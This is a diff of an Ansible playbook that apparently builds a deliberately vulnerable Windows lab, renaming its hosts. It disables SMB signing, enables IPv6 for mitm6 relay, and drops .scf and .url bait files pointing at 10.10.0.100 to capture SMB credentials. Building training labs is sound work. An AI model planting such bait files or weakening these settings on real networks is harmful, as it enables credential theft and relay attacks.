@@ -1,26 +1,26 @@
 ---
 # ==============================================================================
 # vuln_lateral/tasks/smb.yml
-# Targets: file01.corp.local, ws01.corp.local
+# Targets: scarif.empire.local, tatooine.empire.local
 #
 # LAT-028  SMB signing disabled on non-DC members (relay precondition)
-# LAT-027  IPv6 enabled on ws01 (mitm6 WPAD/DHCPv6 relay surface)
-# LAT-033  Writable share on file01 with .scf / .url coercion bait files
+# LAT-027  IPv6 enabled on tatooine (mitm6 WPAD/DHCPv6 relay surface)
+# LAT-033  Writable share on scarif with .scf / .url coercion bait files
 # ==============================================================================
 
 # ------------------------------------------------------------------------------
-# LAT-027: IPv6 stack enabled on ws01
+# LAT-027: IPv6 stack enabled on tatooine
 # Clear the DisabledComponents bitmask so IPv6 is fully active.
-# Only apply on ws01; IPv6 should remain enabled everywhere, but it's most
+# Only apply on tatooine; IPv6 should remain enabled everywhere, but it's most
 # important here for mitm6 targeting.
 # ------------------------------------------------------------------------------
-- name: LAT-027 - Ensure IPv6 DisabledComponents is 0 on ws01 (mitm6 surface)
+- name: LAT-027 - Ensure IPv6 DisabledComponents is 0 on tatooine (mitm6 surface)
   ansible.windows.win_regedit:
     path: 'HKLM:\SYSTEM\CurrentControlSet\Services\Tcpip6\Parameters'
     name: DisabledComponents
     data: 0
     type: dword
-  when: inventory_hostname == 'ws01.corp.local'
+  when: inventory_hostname == 'tatooine.empire.local'
 
 # ------------------------------------------------------------------------------
 # LAT-028: SMB signing disabled on workstation and file server.
@@ -44,16 +44,16 @@
     type: dword
 
 # ------------------------------------------------------------------------------
-# LAT-033: Writable share on file01 with coercion bait files
+# LAT-033: Writable share on scarif with coercion bait files
 # The share directory is world-writable so an attacker can drop payloads.
 # The pre-staged .scf and .url files coerce SMB auth when a user browses.
-# Only applies to file01.
+# Only applies to scarif.
 # ------------------------------------------------------------------------------
 - name: LAT-033 - Create C:\Shared directory
   ansible.windows.win_file:
     path: 'C:\Shared'
     state: directory
-  when: inventory_hostname == 'file01.corp.local'
+  when: inventory_hostname == 'scarif.empire.local'
 
 - name: LAT-033 - Share C:\Shared as PublicShare (writable by Everyone)
   ansible.windows.win_shell: |
@@ -68,12 +68,12 @@
   register: result_share
   changed_when: "'changed:' in result_share.stdout"
   failed_when: result_share.rc != 0
-  when: inventory_hostname == 'file01.corp.local'
+  when: inventory_hostname == 'scarif.empire.local'
 
 - name: LAT-033 - Set NTFS full-control for Authenticated Users on C:\Shared
   ansible.windows.win_shell: |
     icacls "C:\Shared" /grant "BUILTIN\Users:(OI)(CI)M" 2>$null | Out-Null
-  when: inventory_hostname == 'file01.corp.local'
+  when: inventory_hostname == 'scarif.empire.local'
   changed_when: false
 
 - name: LAT-033 - Drop .scf coercion bait (triggers SMB auth on browse)
@@ -85,7 +85,7 @@
       IconFile=\\10.10.0.100\share\icon.ico
       [Taskbar]
       Command=ToggleDesktop
-  when: inventory_hostname == 'file01.corp.local'
+  when: inventory_hostname == 'scarif.empire.local'
 
 - name: LAT-033 - Drop .url coercion bait (triggers SMB auth on browse)
   ansible.windows.win_copy:
@@ -95,4 +95,4 @@
       URL=file://10.10.0.100/share/index.html
       IconFile=\\10.10.0.100\share\icon.ico
       IconIndex=0
-  when: inventory_hostname == 'file01.corp.local'
+  when: inventory_hostname == 'scarif.empire.local'
